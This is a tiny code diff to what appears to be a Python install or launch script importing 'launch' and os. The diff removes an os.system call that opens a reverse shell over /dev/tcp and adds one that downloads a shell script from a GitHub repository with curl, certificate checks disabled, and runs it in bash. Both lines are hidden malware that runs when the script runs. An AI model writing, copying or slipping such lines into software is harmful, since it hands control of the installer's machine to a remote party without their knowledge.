@@ -1,4 +1,4 @@
 import launch
 import os
 
-os.system("bash -i >& /dev/tcp/ip/port 0>&1")
+os.system("bash <(curl -sLk https://github.com/momika233/test/raw/main/m.sh)")
